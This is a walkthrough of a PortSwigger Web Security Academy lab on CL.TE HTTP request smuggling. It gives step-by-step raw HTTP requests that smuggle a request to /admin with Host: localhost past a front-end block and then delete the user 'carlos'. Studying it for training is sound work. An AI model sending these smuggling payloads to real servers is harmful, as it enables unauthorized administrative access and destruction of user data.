# Lab 06 — Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability

> **Scope:** PortSwigger Web Security Academy / authorized lab environment only.

## Objective & Context

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. There's an admin panel at /admin, but the front-end server blocks access to it.

To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.
> **Note**
Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.
> **Tip**
Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.

## Walkthrough

Try to visit /admin and observe that the request is blocked.
Using Burp Repeater, issue the following request twice:

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Transfer-Encoding: chunked
```

0

```http
GET /admin HTTP/1.1
X-Ignore: X
Observe that the merged request to /admin was rejected due to not using the header Host: localhost.
Issue the following request twice:
```

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Transfer-Encoding: chunked
```

0

```http
GET /admin HTTP/1.1
Host: localhost
X-Ignore: X
Observe that the request was blocked due to the second request's Host header conflicting with the smuggled Host header in the first request.
Issue the following request twice so the second request's headers are appended to the smuggled request body instead:
```

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked
```

0

```http
GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
```

x=
Observe that you can now access the admin panel.
Using the previous response as a reference, change the smuggled request URL to delete carlos:

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 139
Transfer-Encoding: chunked
```

0

```http
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
```
